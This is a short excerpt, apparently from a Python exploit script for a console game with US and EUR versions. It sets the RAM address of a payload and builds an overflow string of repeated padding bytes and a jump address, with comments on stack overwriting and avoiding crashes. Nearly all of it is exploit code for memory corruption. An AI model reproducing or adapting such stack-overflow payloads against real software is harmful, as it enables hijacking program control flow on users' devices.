...
payload_location_US=0x02167C6C  #this is where our actual payload is in RAM. we slide to it from the above address (EUR version's address is 021667EC). these values aren't used in this script.
...
haxstring+=("\x20\xA0\xFF"*14 + "\x20\xA0" + "\x00") 	#the jump address being too close to the string's end will cause it to be overwritten with junk on the stack before the jump. that's why the weird padding is added.
														#also, the 20-a0-ff pattern keeps the excess string length from terminating into an infinite loop crash. weird.
